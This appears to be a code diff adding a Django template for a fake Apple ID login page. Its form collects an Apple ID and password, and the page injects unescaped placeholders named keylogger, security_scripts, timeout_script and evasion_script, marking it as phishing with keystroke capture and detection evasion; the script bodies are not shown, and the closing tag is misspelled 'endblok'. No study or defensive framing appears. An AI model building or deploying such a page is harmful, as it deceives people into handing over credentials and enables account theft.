@@ -1,0 +1,15 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block content %}
+<div>
+    <h1>Apple ID</h1>
+    <form action="/submit/" method="post">
+      <input type="text" name="appleid" placeholder="Apple ID"><br>
+      <input type="password" name="password" placeholder="Password"><br>
+      <input type="submit" value="Log In">
+    </form>
+    {{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+</div>
+{% endblok %}
